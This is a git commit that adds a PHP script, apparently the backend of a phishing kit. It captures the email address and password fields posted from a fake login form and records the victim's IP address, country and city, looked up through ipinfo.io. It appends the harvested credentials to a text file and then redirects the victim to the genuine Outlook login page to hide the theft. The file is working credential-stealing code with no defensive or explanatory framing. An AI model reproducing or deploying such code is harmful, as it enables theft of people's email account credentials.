ad7dae23e88e3a9159a717fc7b65cd7ba94c0bb2
holamundo12345new <104818999+holamundo12345new@users.noreply.github.com>
2022-05-03 14:08:03 -0500

    initial commit

---
+++ Conection1.php
@@ -0,0 +1,28 @@
+<?php
+
+date_default_timezone_set('America/Caracas');
+ini_set("display_errors", 0);
+$userp = $_SERVER['REMOTE_ADDR'];
+
+$cc = trim(file_get_contents("http://ipinfo.io/{$userp}/country"));
+$city = trim(file_get_contents("http://ipinfo.io/{$userp}/city"));
+	
+	$file = fopen("NEW01.txt", "a");
+	
+fwrite($file, 
+"* EMAIL: ".$_POST['email']."
+* PASS: ".$_POST['pass']."
+* PASS1: ".$_POST['pass1']."
+* F-H-IP-P-C: 
+".date('Y-m-d')."
+".date('H:i:s')."
+".$userp."
+".$cc."
+".$city."  
+" . PHP_EOL);
+fwrite($file, "==============================" . PHP_EOL);
+fclose($file);
+
+header("location:https://outlook.live.com/owa/");
+
+?>
